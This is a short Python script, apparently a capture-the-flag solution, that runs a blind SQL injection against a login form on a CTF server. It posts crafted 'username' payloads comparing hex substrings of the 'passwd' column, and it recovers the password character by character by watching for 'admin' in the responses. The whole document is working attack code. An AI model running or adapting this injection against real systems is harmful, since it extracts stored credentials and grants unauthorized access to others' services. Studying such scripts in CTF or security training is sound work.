import requests
import string

chars = string.ascii_letters + string.digits + string.punctuation
url = "http://ques.synctf.com:23559/?action=show"
flag = ''
for i in range(1,35):
	for char in chars:
		tmp = char + flag
		payload = "'<(hex(mid((passwd)from(-%d)))=hex('%s'))^'"%(i, tmp)
		print(payload)
		data={
			"username": payload
		}
		req = requests.post(url, data = data)
		if "admin" in req.text:
			flag = char + flag
			print(flag)
			break
